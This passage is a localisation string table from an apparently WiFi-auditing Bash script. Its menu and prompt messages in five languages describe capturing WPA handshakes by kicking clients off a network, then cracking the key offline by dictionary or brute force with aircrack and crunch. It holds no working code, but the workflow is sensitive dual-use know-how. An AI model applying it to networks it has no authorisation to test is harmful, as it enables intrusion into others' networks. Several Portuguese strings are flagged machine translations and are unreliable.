	arr["spanish",142]="Si tras un ataque el Handshake no aparece, vuelve a intentarlo o cambia de ataque hasta conseguirlo"
	arr["french",142]="Si vous n'obtenez pas le Handshake après une attaque, veuillez recommencer ou bien changer d'attaque jusqu'à son obtention"
	arr["catalan",142]="Si després d'un atac el Handshake no apareix, torna a intentar-ho o canvia d'atac fins aconseguir-ho"
	arr["portuguese",142]="$pending_of_translation Se o Handshake depois de um belo não aparecer, tente novamente ou alteração de ataque para chegar"

	arr["english",143]="Two windows will be opened. One with the Handshake capturer and other with the attack to force clients to reconnect"
	arr["spanish",143]="Se abrirán dos ventanas. Una con el capturador del Handshake y otra con el ataque para expulsar a los clientes y forzarles a reconectar"
	arr["french",143]="Deux fenêtres vont s'ouvrir: La première pour capturer le handshake et la deuxième pour effectuer l'attaque visant à expulser les clients du réseau et les forcer à renégocier un Handshake pour se reconnecter"
	arr["catalan",143]="S'obriran dues finestres. Una amb el capturador de Handshake i una altra amb l'atac per expulsar als clients i forçar-los a reconnectar"
	arr["portuguese",143]="$pending_of_translation Duas janelas será aberto. Um Handshake com o grabber e outra com o ataque para levar os clientes para longe e forçá-los a reconectar"

	arr["english",144]="Don't close any window manually, script will do when needed. In about 20 seconds maximum you'll know if you've got the Handshake"
	arr["spanish",144]="No cierres manualmente ninguna ventana, el script lo hará cuando proceda. En unos 20 segundos como máximo sabrás si conseguiste el Handshake"
	arr["french",144]="Ne pas fermer une des fenêtres manuellement:  Le script va le faire automatiquement si besoin est. Vos saurez dans tout a plus 20 secondes si avez obtenu le Handshake"
	arr["catalan",144]="No tanquis manualment cap finestra, el script ho farà quan escaigui. En uns 20 segons com a màxim sabràs si vas aconseguir el Handshake"
	arr["portuguese",144]="$pending_of_translation Não há bloqueios de janela manualmente, o script sempre que necessário. Em cerca de 20 segundos no máximo você sabe se você tem o Handshake"

	arr["english",145]="Did you get the Handshake? "${pink_color}"(Look at the top right corner of the capture window) "${normal_color}"[y/n]"
	arr["spanish",145]="¿Conseguiste el Handshake? "${pink_color}"(Mira en la parte superior derecha de la ventana de captura) "${normal_color}"[y/n]"
	arr["french",145]="Avez-vous obtenu le Handshake? "${pink_color}"(Regardez dans le coin supérieur en haut à droite de la fenêtre de capture) "${normal_color}"[y/n]"
	arr["catalan",145]="¿Has aconseguit el Handshake? "${pink_color}"(Mira a la part superior dreta de la finestra de captura) "${normal_color}"[y/n]"
	arr["portuguese",145]="$pending_of_translation Deram-lhe o Handshake? "${pink_color}"(Olhe para o canto superior direito da janela de captura) "${normal_color}"[y/n]"

	arr["english",146]="It seems we failed... try it again or choose another attack"
	arr["spanish",146]="Parece que no lo hemos conseguido... inténtalo de nuevo o elige otro ataque"
	arr["french",146]="Il semble que c'est un échec... Essayez à nouveau ou choisissez une autre attaque"
	arr["catalan",146]="Sembla que no ho hem aconseguit... intenta-ho de nou o tria un altre atac"
	arr["portuguese",146]="$pending_of_translation Parece que não estamos lá... tente novamente ou escolher um outro ataque"

	arr["english",147]="4.  Return to Handshake tools menu"
	arr["spanish",147]="4.  Volver al menú de herramientas Handshake"
	arr["french",147]="4.  Retourner au menu des outils pour la capture du handshake"
	arr["catalan",147]="4.  Tornar al menú d'eines Handshake"
	arr["portuguese",147]="$pending_of_translation 4.  Voltar para o menu de ferramentas do Handshake"

	arr["english",148]="Type the path to store the file or press Enter to accept the default proposal "${normal_color}"[$handshakepath]"
	arr["spanish",148]="Escribe la ruta donde guardaremos el fichero o pulsa Enter para aceptar la propuesta por defecto "${normal_color}"[$handshakepath]"
	arr["french",148]="Entrez le chemin où vous voulez enregistrer le fichier ou bien appuyez sur Entrée pour utiliser le chemin proposé "${normal_color}"[$handshakepath]"
	arr["catalan",148]="Escriu la ruta on guardarem el fitxer o prem Enter per acceptar la proposta per defecte "${normal_color}"[$handshakepath]"
	arr["portuguese",148]="$pending_of_translation Digite o caminho onde armazenar o arquivo ou pressione Enter para aceitar as propostas padrão "${normal_color}"[$handshakepath]"

	arr["english",149]="Handshake file generated successfully at ["${normal_color}"$enteredpath"${blue_color}"]"
	arr["spanish",149]="Fichero de Handshake generado con éxito en ["${normal_color}"$enteredpath"${blue_color}"]"
	arr["french",149]="Fichier Handshake généré avec succès dans ["${normal_color}"$enteredpath"${blue_color}"]"
	arr["catalan",149]="Fitxer de Handshake generat amb èxit a ["${normal_color}"$enteredpath"${blue_color}"]"
	arr["portuguese",149]="$pending_of_translation Arquivo Handshake gerado com sucesso ["${normal_color}"$enteredpath"${blue_color}"]"

	arr["english",150]="No captured Handshake file detected during this session..."
	arr["spanish",150]="No se ha detectado ningún fichero de Handshake capturado en esta sesión..."
	arr["french",150]="Aucun fichier Handshake valide détecté durant cette session..."
	arr["catalan",150]="No s'ha detectat un fitxer de Handshake capturat en aquesta sessió..."
	arr["portuguese",150]="$pending_of_translation Não é detectado arquivo Handshake capturado nesta sessão..."

	arr["english",151]="Handshake captured file detected during this session ["${normal_color}"$enteredpath"${blue_color}"]"
	arr["spanish",151]="Se ha detectado un fichero de Handshake capturado en esta sesión ["${normal_color}"$enteredpath"${blue_color}"]"
	arr["french",151]="Un fichier contenant un Handshake a été détecté pour la session effectuée et se trouve dans "${normal_color}"$enteredpath"${blue_color}"]"
	arr["catalan",151]="S'ha detectat un fitxer de Handshake capturat en aquesta sessió ["${normal_color}"$enteredpath"${blue_color}"]"
	arr["portuguese",151]="$pending_of_translation Arquivo Handshake detectado capturado nesta sessão ["${normal_color}"$enteredpath"${blue_color}"]"

	arr["english",152]="Do you want to clean/optimize the Handshake captured file during this session? "${normal_color}"[y/n]"
	arr["spanish",152]="¿Quieres limpiar/optimizar el fichero de Handshake capturado en esta sesión? "${normal_color}"[y/n]"
	arr["french",152]="Voulez-vous nettoyer/optimiser le fichier Handshake capturé pendant cette session? "${normal_color}"[y/n]"
	arr["catalan",152]="¿Vols netejar/optimitzar el fitxer de Handshake capturat en aquesta sessió? "${normal_color}"[y/n]"
	arr["portuguese",152]="$pending_of_translation Quer limpar/otimizar o arquivo handshake capturado nesta sessão? "${normal_color}"[y/n]"

	arr["english",153]="File cleaned/optimized successfully"
	arr["spanish",153]="Fichero limpiado/optimizado con éxito"
	arr["french",153]="Fichier lavé/optimisé avec succès"
	arr["catalan",153]="Fitxer netejat/optimitzat amb èxit"
	arr["portuguese",153]="$pending_of_translation Limpei arquivo/otimizado com sucesso"

	arr["english",154]="Set path to file :"
	arr["spanish",154]="Introduce la ruta al fichero :"
	arr["french",154]="Entrez le chemin vers le fichier :"
	arr["catalan",154]="Introdueix la ruta al fitxer :"
	arr["portuguese",154]="$pending_of_translation Digite o caminho para o arquivo :"

	arr["english",155]="The directory exists but you didn't specify filename. It will be autogenerated ["${normal_color}"$suggested_filename"${yellow_color}"]"
	arr["spanish",155]="El directorio existe pero no se especificó nombre de fichero. Se autogenerará ["${normal_color}"$suggested_filename"${yellow_color}"]"
	arr["french",155]="Le dossier existe mais sans qu'aucun nom pour le fichier soit précisé. Il sera donc appelé ["${normal_color}"$suggested_filename"${yellow_color}"]"
	arr["catalan",155]="El directori existeix però no s'ha especificat nom de fitxer. Es autogenerará ["${normal_color}"$suggested_filename"${yellow_color}"]"
	arr["portuguese",155]="$pending_of_translation O diretório existe, mas nenhum nome de arquivo especificado. Ele irá gerar automaticamente ["${normal_color}"$suggested_filename"${yellow_color}"]"

	arr["english",156]="Directory not exists"
	arr["spanish",156]="El directorio no existe"
	arr["french",156]="Le dossier n'existe pas"
	arr["catalan",156]="El directori no existeix"
	arr["portuguese",156]="$pending_of_translation O diretório não existe"

	arr["english",157]="The path exists but you don't have write permissions"
	arr["spanish",157]="La ruta existe pero no tienes permisos de escritura"
	arr["french",157]="Le chemin existe mais vous ne disposez pas des permis d'écriture"
	arr["catalan",157]="La ruta existeix, però no tens permisos d'escriptura"
	arr["portuguese",157]="$pending_of_translation A rota existe, mas você não tem permissões de gravação"

	arr["english",158]="The path is valid and you have write permissions. Script can continue..."
	arr["spanish",158]="La ruta es válida y tienes permisos de escritura. El script puede continuar..."
	arr["french",158]="Le chemin est valide et vous disposez des privilèges nécessaires pour l'écriture. Le script peut continuer..."
	arr["catalan",158]="La ruta és vàlida i tens permisos d'escriptura. El script pot continuar..."
	arr["portuguese",158]="$pending_of_translation A rota é válida e você tem permissões de gravação. O script pode continuar..."

	arr["english",159]="The file doesn't need to be cleaned/optimized"
	arr["spanish",159]="El fichero no necesita ser limpiado/optimizado"
	arr["french",159]="Le fichier n'a pas besoin d'être nettoyé/optimisé"
	arr["catalan",159]="El fitxer no necessita ser netejat/optimitzat"
	arr["portuguese",159]="$pending_of_translation O arquivo não precisam ser limpos/otimizado"

	arr["english",160]="No tasks to perform on exit"
	arr["spanish",160]="No hay que realizar ninguna tarea a la salida"
	arr["french",160]="Aucune opération n'est planifiée pour l’arrêt du script"
	arr["catalan",160]="No cal fer cap tasca a la sortida"
	arr["portuguese",160]="$pending_of_translation Nenhuma tarefa não deve fazer a saída"

	arr["english",161]="File not exists"
	arr["spanish",161]="El fichero no existe"
	arr["french",161]="Le fichier n' existe pas"
	arr["catalan",161]="El fitxer no existeix"
	arr["portuguese",161]="$pending_of_translation O arquivo não existe"

	arr["english",162]="Congratulations!!"
	arr["spanish",162]="Enhorabuena!!"
	arr["french",162]="Félicitations!!"
	arr["catalan",162]="Enhorabona!!"
	arr["portuguese",162]="$pending_of_translation Parabéns!!"

	arr["english",163]="It is recommended to launch the script as root user or using \"sudo\". Make sure you have permission to launch commands like rfkill or airmon for example"
	arr["spanish",163]="Se recomienda lanzar el script como usuario root o usando \"sudo\". Asegúrate de tener permisos para lanzar comandos como rfkill o airmon por ejemplo"
	arr["french",163]="Il faut lancer le script en tant que root ou en utilisant \"sudo\". Assurez-vous de bien dsiposer des privilèges nécessaires à l’exécution de commandes comme rfkill ou airmon"
	arr["catalan",163]="Es recomana llançar l'script com a usuari root o utilitzeu \"sudo\". Assegura't de tenir permisos per llançar ordres com rfkill o airmon per exemple"
	arr["portuguese",163]="$pending_of_translation Recomenda-se iniciar o script como root ou usando \"sudo\". Certifique-se de que você tem permissão para iniciar comandos como por exemplo rfkill ou airmon"

	arr["english",164]="Cleaning temp files"
	arr["spanish",164]="Limpiando archivos temporales"
	arr["french",164]="Effacement des fichiers temporaires"
	arr["catalan",164]="Netejant arxius temporals"
	arr["portuguese",164]="$pending_of_translation Limpar arquivos temporários"

	arr["english",165]="Checking if cleaning/restoring tasks are needed..."
	arr["spanish",165]="Comprobando si hay que realizar tareas de limpieza/restauración..."
	arr["french",165]="Vérification de la nécessité d'effectuer ou pas des opérations de nettoyage/restauration..."
	arr["catalan",165]="Comprovant si cal realitzar tasques de neteja/restauració..."
	arr["portuguese",165]="$pending_of_translation Verificar se para executar a limpeza/restauração..."

	arr["english",166]="Do you want to preserv monitor mode for your card on exit? "${normal_color}"[y/n]"
	arr["spanish",166]="¿Deseas conservar el modo monitor de tu interfaz al salir? "${normal_color}"[y/n]"
	arr["french",166]="Voulez-vous laisser votre interface en mode moniteur après l'arrêt du script? "${normal_color}"[y/n]"
	arr["catalan",166]="¿Vols conservar el mode monitor de la teva interfície en sortir? "${normal_color}"[y/n]"
	arr["portuguese",166]="$pending_of_translation Quer manter sua interface de modo monitor ir? "${normal_color}"[y/n]"

	arr["english",167]="Putting your interface in managed mode"
	arr["spanish",167]="Poniendo interfaz en modo managed"
	arr["french",167]="L'interface est en train de passer en mode managed"
	arr["catalan",167]="Configurant la interfície en mode managed"
	arr["portuguese",167]="$pending_of_translation Colocando interface de modo managed"

	arr["english",168]="Launching previously killed processes"
	arr["spanish",168]="Arrancando procesos cerrados anteriormente"
	arr["french",168]="Lancement des processus précédemment tués"
	arr["catalan",168]="Llançant processos tancats anteriorment"
	arr["portuguese",168]="$pending_of_translation Processos de inicialização previamente fechados"

	arr["english",169]="6.  Offline WPA/WPA2 decrypt menu"
	arr["spanish",169]="6.  Menú de desencriptado WPA/WPA2 offline"
	arr["french",169]="6.  Menu crack WPA/WPA2 offline"
	arr["catalan",169]="6.  Menú per desxifrar WPA/WPA2 offline"
	arr["portuguese",169]="$pending_of_translation 6.  Menu de descriptografado WPA/WPA2 offline"

	arr["english",170]="Offline WPA/WPA2 decrypt menu"
	arr["spanish",170]="Menú de desencriptado WPA/WPA2 offline"
	arr["french",170]="Menu crack WPA/WPA2 offline"
	arr["catalan",170]="Menú per desxifrar WPA/WPA2 offline"
	arr["portuguese",170]="$pending_of_translation Descriptografado WPA Menu / WPA2 offline"

	arr["english",171]="The key decrypt process is performed offline on a previously captured file"
	arr["spanish",171]="El proceso de desencriptado de las claves se realiza de manera offline sobre un fichero capturado previamente"
	arr["french",171]="Le crack de la clef s'effectue offline en utilisant le fichier capturé antérieurement"
	arr["catalan",171]="El procés de desencriptació de les claus es realitza de manera offline sobre un fitxer capturat prèviament"
	arr["portuguese",171]="$pending_of_translation O processo de chave de decodificação é realizada de modo offline em um arquivo previamente capturado"

	arr["english",172]="1.  (aircrack) Dictionary attack against capture file"
	arr["spanish",172]="1.  (aircrack) Ataque de diccionario sobre fichero de captura"
	arr["french",172]="1.  (aircrack) Attaque de dictionnaire en utilisant le fichier de capture"
	arr["catalan",172]="1.  (aircrack) Atac de diccionari sobre fitxer de captura"
	arr["portuguese",172]="$pending_of_translation 1.  (aircrack) Dicionário ataque em arquivo de captura"

	arr["english",173]="Selected capture file: "${pink_color}"$enteredpath"${normal_color}
	arr["spanish",173]="Fichero de captura seleccionado: "${pink_color}"$enteredpath"${normal_color}
	arr["french",173]="Fichier de capture sélectionné: "${pink_color}"$enteredpath"${normal_color}
	arr["catalan",173]="Fitxer de captura seleccionat: "${pink_color}"$enteredpath"${normal_color}
	arr["portuguese",173]="$pending_of_translation Seleccionado arquivo de captura: "${pink_color}"$enteredpath"${normal_color}

	arr["english",174]="6.  Return to main menu"
	arr["spanish",174]="6.  Volver al menú principal"
	arr["french",174]="6.  Retourner au menu principal"
	arr["catalan",174]="6.  Tornar al menú principal"
	arr["portuguese",174]="$pending_of_translation 6.  Volte ao menu principal"

	arr["english",175]="2.  (aircrack + crunch) Bruteforce attack against capture file"
	arr["spanish",175]="2.  (aircrack + crunch) Ataque de fuerza bruta sobre fichero de captura"
	arr["french",175]="2.  (aircrack + crunch) Attaque de force brute en utilisant le fichier de capture"
	arr["catalan",175]="2.  (aircrack + crunch) Atac de força bruta sobre fitxer de captura"
	arr["portuguese",175]="$pending_of_translation 2.  (aircrack + crunch) Ataque de força bruta em arquivo de captura"

	arr["english",176]="aircrack CPU, non GPU attacks"
	arr["spanish",176]="ataques aircrack CPU, no GPU"
	arr["french",176]="attaques aircrack CPU, pas GPU"
	arr["catalan",176]="atacs aircrack CPU, no GPU"
	arr["portuguese",176]="$pending_of_translation ataques aircrack CPU, não GPU"

	arr["english",177]="Selected captured file: "${pink_color}"None"${normal_color}
	arr["spanish",177]="Fichero capturado seleccionado: "${pink_color}"Ninguno"${normal_color}
	arr["french",177]="Fichier de capture sélectionné: "${pink_color}"Aucun"${normal_color}
	arr["catalan",177]="Fitxer capturat seleccionat: "${pink_color}"Ningú"${normal_color}
	arr["portuguese",177]="$pending_of_translation Seleccionado arquivo capturado: "${pink_color}"Nenhum"${normal_color}

	arr["english",178]="To decrypt the key of a WPA/WPA2 network, the capture file must contain a Handshake"
	arr["spanish",178]="Para desencriptar la clave de una red WPA/WPA2, el fichero de captura debe contener un Handshake"
	arr["french",178]="Pour cracker la clé d'un réseau WPA/WPA2 le fichier de capture doit contenir un Handshake"
	arr["catalan",178]="Per desencriptar la clau d'una xarxa WPA/WPA2 el fitxer de captura ha de contenir un Handshake"
	arr["portuguese",178]="$pending_of_translation Para decifrar a chave para uma rede WPA/WPA2, o arquivo de captura deve conter um Handshake"

	arr["english",179]="Decrypting by bruteforce, it could pass hours, days, weeks or even months to take it depending on the complexity of the password and your processing speed"
	arr["spanish",179]="Desencriptando por fuerza bruta, podrían pasar horas, días, semanas o incluso meses hasta conseguirlo dependiendo de la complejidad de la contraseña y de tu velocidad de proceso"
	arr["french",179]="Le crack de la clef par attaque de type brute force peut prendre des heures, des jours, des semaines ou même des mois en fonction de la complexité de la clef et de la puissance de calcul de votre matériel"
	arr["catalan",179]="Desencriptant per força bruta, podrien passar hores, dies, setmanes o fins i tot mesos fins a aconseguir-ho depenent de la complexitat de la contrasenya i de la teva velocitat de procés"
	arr["portuguese",179]="$pending_of_translation Descriptografar força bruta, eles podiam passar horas, dias, semanas ou mesmo meses para se dependendo da complexidade de sua senha e velocidade de processamento"

	arr["english",180]="Enter the path of a dictionary file :"
	arr["spanish",180]="Introduce la ruta de un fichero de diccionario :"
	arr["french",180]="Saisissez un chemin vers un dictionnaire d'attaque :"
	arr["catalan",180]="Introdueix la ruta d'un fitxer de diccionari :"
	arr["portuguese",180]="$pending_of_translation Digite o caminho de um arquivo de dicionário :"

	arr["english",181]="The path to the dictionary file is valid. Script can continue..."
	arr["spanish",181]="La ruta al fichero de diccionario es válida. El script puede continuar..."
	arr["french",181]="Le chemin vers le fichier dictionnaire est valide. Le script peut continuer..."
	arr["catalan",181]="La ruta cap al fitxer de diccionari és vàlida. El script pot continuar..."
	arr["portuguese",181]="$pending_of_translation O caminho para o arquivo de dicionário é válido. O script pode continuar..."

	arr["english",182]="Selected dictionary file: "${pink_color}"$dictionary"${normal_color}
	arr["spanish",182]="Fichero de diccionario seleccionado: "${pink_color}"$dictionary"${normal_color}
	arr["french",182]="Fichier dictionnaire sélectionné: "${pink_color}"$dictionary"${normal_color}
	arr["catalan",182]="Fitxer de diccionari seleccionat: "${pink_color}"$dictionary"${normal_color}
	arr["portuguese",182]="$pending_of_translation Seleccionado arquivo de dicionário: "${pink_color}"$dictionary"${normal_color}

	arr["english",183]="You already have selected a dictionary file during this session ["${normal_color}"$dictionary"${blue_color}"]"
	arr["spanish",183]="Ya tienes seleccionado un fichero de diccionario en esta sesión ["${normal_color}"$dictionary"${blue_color}"]"
	arr["french",183]="Vous avez déjà sélectionné un fichier dictionnaire pour cette session "${normal_color}"$dictionary"${blue_color}"]"
	arr["catalan",183]="Ja tens seleccionat un fitxer de diccionari en aquesta sessió ["${normal_color}"$dictionary"${blue_color}"]"
	arr["portuguese",183]="$pending_of_translation Você selecionou um arquivo de dicionário nesta sessão ["${normal_color}"$dictionary"${blue_color}"]"

	arr["english",184]="Do you want to use this already selected dictionary file? "${normal_color}"[y/n]"
	arr["spanish",184]="¿Quieres utilizar este fichero de diccionario ya seleccionado? "${normal_color}"[y/n]"
	arr["french",184]="Souhaitez vous utiliser le dictionnaire déjà sélectionné? "${normal_color}"[y/n]"
	arr["catalan",184]="¿Vols fer servir aquest fitxer de diccionari ja seleccionat? "${normal_color}"[y/n]"
	arr["portuguese",184]="$pending_of_translation Você quer usar esse arquivo de dicionário já seleccionada? "${normal_color}"[y/n]"

	arr["english",185]="Selected BSSID: "${pink_color}"None"${normal_color}
	arr["spanish",185]="BSSID seleccionado: "${pink_color}"Ninguno"${normal_color}
	arr["french",185]="BSSID sélectionné: "${pink_color}"Aucun"${normal_color}
	arr["catalan",185]="BSSID seleccionat: "${pink_color}"Ningú"${normal_color}
	arr["portuguese",185]="$pending_of_translation BSSID selecionado: "${pink_color}"Nenhum"${normal_color}

	arr["english",186]="You already have selected a capture file during this session ["${normal_color}"$enteredpath"${blue_color}"]"
	arr["spanish",186]="Ya tienes seleccionado un fichero de captura en esta sesión ["${normal_color}"$enteredpath"${blue_color}"]"
	arr["french",186]="Vous avez déjà sélectionné un fichier de capture pour cette session "${normal_color}"$enteredpath"${blue_color}"]"
	arr["catalan",186]="Ja tens seleccionat un fitxer de captura en aquesta sessió ["${normal_color}"$enteredpath"${blue_color}"]"
	arr["portuguese",186]="$pending_of_translation Você selecionou um arquivo de captura nesta sessão ["${normal_color}"$enteredpath"${blue_color}"]"

	arr["english",187]="Do you want to use this already selected capture file? "${normal_color}"[y/n]"
	arr["spanish",187]="¿Quieres utilizar este fichero de captura ya seleccionado? "${normal_color}"[y/n]"
	arr["french",187]="Souhaitez vous utiliser le fichier de capture déjà sélectionné? "${normal_color}"[y/n]"
	arr["catalan",187]="¿Vols fer servir aquest fitxer de captura ja seleccionat? "${normal_color}"[y/n]"
	arr["portuguese",187]="$pending_of_translation Você quer usar esse arquivo e captura selecionado? "${normal_color}"[y/n]"

	arr["english",188]="Enter the path of a captured file :"
	arr["spanish",188]="Introduce la ruta de un fichero de captura :"
	arr["french",188]="Entrez le chemin vers un fichier de capture :"
	arr["catalan",188]="Introdueix la ruta d'un fitxer de captura :"
	arr["portuguese",188]="$pending_of_translation Digite o caminho para um arquivo de captura :"

	arr["english",189]="The path to the capture file is valid. Script can continue..."
	arr["spanish",189]="La ruta al fichero de captura es válida. El script puede continuar..."
	arr["french",189]="Le chemin du fichier de capture est valide. Le script peut continuer..."
	arr["catalan",189]="La ruta al fitxer de captura és vàlida. El script pot continuar..."
	arr["portuguese",189]="$pending_of_translation O caminho para o arquivo de captura é válido. O script pode continuar..."

	arr["english",190]="Starting decrypt. When started, press Ctrl+C to stop..."
	arr["spanish",190]="Comenzando desencriptado. Una vez empezado, pulse Ctrl+C para pararlo..."
	arr["french",190]="Lancement du crack. Pressez Ctrl+C pour l'arrêter..."
	arr["catalan",190]="Començant el desencriptat. Un cop començat, premeu Ctrl+C per aturar-lo..."
	arr["portuguese",190]="$pending_of_translation Começando descriptografado. Uma vez iniciado, pressione Ctrl+C para pará-lo..."

	arr["english",191]="Capture file you selected is an unsupported file format (not a pcap or IVs file)"
	arr["spanish",191]="El fichero de captura que has seleccionado tiene un formato no soportado (no es un fichero pcap o de IVs)"
	arr["french",191]="Le fichier de capture que vous avez sélectionné est dans un format non supporté (ce n'est pas un fichier pcap ou IVs)"
	arr["catalan",191]="El fitxer de captura que has seleccionat té un format no suportat (no és un fitxer pcap o de IVs)"
	arr["portuguese",191]="$pending_of_translation O arquivo de captura selecionado tem um formato não suportado (não um pcap arquivo ou IVs)"

	arr["english",192]="You already have selected a BSSID during this session and is present in capture file ["${normal_color}"$bssid"${blue_color}"]"
	arr["spanish",192]="Ya tienes seleccionado un BSSID en esta sesión y está presente en el fichero de captura ["${normal_color}"$bssid"${blue_color}"]"
	arr["french",192]="Vous avez déjà sélectionné un BSSID pour la session en cours et est présent dans le fichier de capture "${normal_color}"$bssid"${blue_color}"]"
	arr["catalan",192]="Ja tens seleccionat un BSSID en aquesta sessió i està present en el fitxer de captura ["${normal_color}"$bssid"${blue_color}"]"
	arr["portuguese",192]="$pending_of_translation Seleccionou uma BSSID nesta sessão e está presente no arquivo de captura ["${normal_color}"$bssid"${blue_color}"]"

	arr["english",193]="Do you want to use this already selected BSSID? "${normal_color}"[y/n]"
	arr["spanish",193]="¿Quieres utilizar este BSSID ya seleccionado? "${normal_color}"[y/n]"
	arr["french",193]="Souhaitez vous utiliser le BSSID déjà sélectionné? "${normal_color}"[y/n]"
	arr["catalan",193]="¿Vols fer servir aquest BSSID ja seleccionat? "${normal_color}"[y/n]"
	arr["portuguese",193]="$pending_of_translation Você quer usar este BSSID já seleccionada? "${normal_color}"[y/n]"

	arr["english",194]="Enter the minimum length of the key to decrypt (8-63) :"
	arr["spanish",194]="Introduce la longitud mínima de la clave a desencriptar (8-63) :"
	arr["french",194]="Entrez la longueur minimale de la clef à cracker (8-63) :"
	arr["catalan",194]="Introdueix la longitud mínima de la clau a desxifrar (8-63) :"
	arr["portuguese",194]="$pending_of_translation Entre o tamanho mínimo da chave para descriptografar (8-63) :"

	arr["english",195]="Enter the maximum length of the key to decrypt ($minlength-63) :"
	arr["spanish",195]="Introduce la longitud máxima de la clave a desencriptar ($minlength-63) :"
	arr["french",195]="Entrez la longueur maximale de la clef à cracker ($minlength-63) :"
	arr["catalan",195]="Introdueix la longitud màxima de la clau a desxifrar ($minlength-63) :"
	arr["portuguese",195]="$pending_of_translation Digite o comprimento máximo da chave para descriptografar ($minlength-63) :"

	arr["english",196]="Select the character set to use :"
	arr["spanish",196]="Selecciona el juego de caracteres a utilizar :"
	arr["french",196]="Sélectionnez le jeu de caractères à utiliser :"
	arr["catalan",196]="Selecciona el joc de caràcters a utilitzar :"
	arr["portuguese",196]="$pending_of_translation Selecione o conjunto de caracteres a ser usado :"

	arr["english",197]="1.  Lowercase chars"
	arr["spanish",197]="1.  Caracteres en minúsculas"
	arr["french",197]="1.  Lettres minuscules"
	arr["catalan",197]="1.  Caràcters en minúscules"
	arr["portuguese",197]="$pending_of_translation 1.  Caracteres em minúsculas"

	arr["english",198]="2.  Uppercase chars"
	arr["spanish",198]="2.  Caracteres en mayúsculas"
	arr["french",198]="2.  Lettres majuscules"
	arr["catalan",198]="2.  Caràcters en majúscules"
	arr["portuguese",198]="$pending_of_translation 2.  Caracteres em maiúsculas"

	arr["english",199]="3.  Numeric chars"
	arr["spanish",199]="3.  Caracteres numéricos"
	arr["french",199]="3.  Chiffres"
	arr["catalan",199]="3.  Caràcters numèrics"
	arr["portuguese",199]="$pending_of_translation 3.  Caracteres numéricos"

	arr["english",200]="4.  Symbol chars"
	arr["spanish",200]="4.  Caracteres símbolos"
	arr["french",200]="4.  Symboles"
	arr["catalan",200]="4.  Caràcters símbols"
	arr["portuguese",200]="$pending_of_translation 4.  Símbolos"

	arr["english",201]="5.  Lowercase + uppercase chars"
	arr["spanish",201]="5.  Caracteres en minúsculas + mayúsculas"
	arr["french",201]="5.  Lettres minuscules + majuscules"
	arr["catalan",201]="5.  Caràcters en minúscules + majúscules"
	arr["portuguese",201]="$pending_of_translation 5.  Características minúsculas + maiúsculas"

	arr["english",202]="6.  Lowercase + numeric chars"
	arr["spanish",202]="6.  Caracteres en minúsculas + numéricos"
	arr["french",202]="6.  Lettres minuscules + chiffres"
	arr["catalan",202]="6.  Caràcters en minúscules + numèrics"
	arr["portuguese",202]="$pending_of_translation 6.  Caracteres em minúsculas + numéricos"

	arr["english",203]="7.  Uppercase + numeric chars"
	arr["spanish",203]="7.  Caracteres en mayúsculas + numéricos"
	arr["french",203]="7.  Lettres majuscules + chiffres"
	arr["catalan",203]="7.  Caràcters en majúscules + numèrics"
	arr["portuguese",203]="$pending_of_translation 7.  Caracteres em maiúsculas + numéricos"

	arr["english",204]="8.  Symbol + numeric chars"
	arr["spanish",204]="8.  Caracteres símbolos + numéricos"
	arr["french",204]="8.   Symboles + chiffres"
	arr["catalan",204]="8.  Caràcters símbols + numèrics"
	arr["portuguese",204]="$pending_of_translation 8.  Símbolos + numéricos"

	arr["english",205]="9.  Lowercase + uppercase + numeric chars"
	arr["spanish",205]="9.  Caracteres en minúsculas + mayúsculas + numéricos"
	arr["french",205]="9.  Lettres minuscules et majuscules + chiffres"
	arr["catalan",205]="9.  Caràcters en minúscules + majúscules + numèrics"
	arr["portuguese",205]="$pending_of_translation 9.  Caracteres em minúsculas + maiúsculas + numéricos"

	arr["english",206]="10. Lowercase + uppercase + symbol chars"
	arr["spanish",206]="10. Caracteres en minúsculas + mayúsculas + símbolos"
	arr["french",206]="10. Lettres minuscules et majuscules + symboles"
	arr["catalan",206]="10. Caràcters en minúscules + majúscules + símbols"
	arr["portuguese",206]="$pending_of_translation 10. Caracteres em minúsculas + maiúsculas + símbolos"

	arr["english",207]="11. Lowercase + uppercase + numeric + symbol chars"
	arr["spanish",207]="11. Caracteres en minúsculas + mayúsculas + numéricos + símbolos"
	arr["french",207]="11. Lettres minuscules et majuscules + chiffres + symboles"
	arr["catalan",207]="11. Caràcters en minúscules + majúscules + numèrics + símbols"
	arr["portuguese",207]="$pending_of_translation 11. Caracteres em minúsculas + maiúsculas + numéricos + símbolos"

	arr["english",208]="If you choose a big charset and a long key length, the proccess could take so much time"
	arr["spanish",208]="Si eliges un juego de caracteres amplio y una longitud de clave grande, el proceso podría demorarse mucho tiempo"
	arr["french",208]="Si vous choisissez un jeu de caractères ample et une longitude de clef importante, le processus pourrait prendre beaucoup de temps"
	arr["catalan",208]="Si tries un joc de caràcters ampli i una longitud de clau gran, el procés podria demorar-se molt temps"
	arr["portuguese",208]="$pending_of_translation Se você escolher um conjunto de caracteres de largura e grande comprimento da chave, o processo pode levar um longo tempo"

	arr["english",209]="The charset to use is : ["${normal_color}"$showcharset"${blue_color}"]"
	arr["spanish",209]="El juego de caracteres elegido es : ["${normal_color}"$showcharset"${blue_color}"]"
	arr["french",209]="Le jeu de caractères définit est : ["${normal_color}"$showcharset"${blue_color}"]"
	arr["catalan",209]="El joc de caràcters escollit és : ["${normal_color}"$showcharset"${blue_color}"]"
	arr["portuguese",209]="$pending_of_translation O jogo é escolhido caracteres: ["${normal_color}"$showcharset"${blue_color}"]"

	arr["english",210]="The script will check for internet access looking for a newer version. Please be patient..."
	arr["spanish",210]="El script va a comprobar si tienes acceso a internet para ver si existe una nueva versión. Por favor ten paciencia..."
	arr["french",210]="Le script va vérifier que vous aillez accès à internet pour voir si une nouvelle version du script est disponible. Soyez patients s'il vous plaît..."
	arr["catalan",210]="El script va a comprovar si tens accés a internet per veure si hi ha una nova versió. Si us plau té paciència..."
	arr["portuguese",210]="$pending_of_translation O script irá verificar se você tem acesso à internet para ver se uma nova versão. Por favor, seja paciente..."

	arr["english",211]="It seems you have no internet access. The script can't connect to repository. It will continue without updating..."
	arr["spanish",211]="Parece que no tienes conexión a internet. El script no puede conectar al repositorio. Continuará sin actualizarse..."
	arr["french",211]="Il semble que vous ne pouvez pas vous connecter à internet. Impossible dans ces conditions de pouvoir accéder aux dépôts. Le script va donc s’exécuter sans s'actualiser..."
	arr["catalan",211]="Sembla que no tens connexió a internet. El script no pot connectar al repositori. Continuarà sense actualitzar-se..."
	arr["portuguese",211]="$pending_of_translation Parece que você não tem acesso à internet. O script não pode conectar-se ao repositório. Ele continuará sem atualizar..."

